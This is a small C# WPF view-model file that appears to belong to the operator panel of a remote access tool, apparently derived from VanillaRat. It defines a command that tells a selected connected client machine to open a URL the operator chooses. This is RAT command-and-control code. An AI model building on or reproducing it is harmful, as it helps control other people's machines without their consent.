using Hangfire.Annotations;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;
using TaskManager.Command;
using VanillaRat.Classes;
using WpfApp15.ViewModel;

namespace WpfApp15.Scripts
{
    class BrowserModel : MainViewModel
    {
        private string url;
        public string Url
        {
            get=>url;
            set
            {
                url = value;
                OnPropertyChanged(nameof(Url));
            }
        }
        void OpenBrowser()
        {
            Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("OpenWebsite<{" + Url + "}>"));
            TaskManager.ViewModel.BrowserActive = false;
        }
        public BrowserModel(Window window):base(window)
        {
            OpenUrl = new RelayCommand2(()=>
            {
                OpenBrowser();
            });
        }
        public ICommand OpenUrl { get; set; }
    }
}
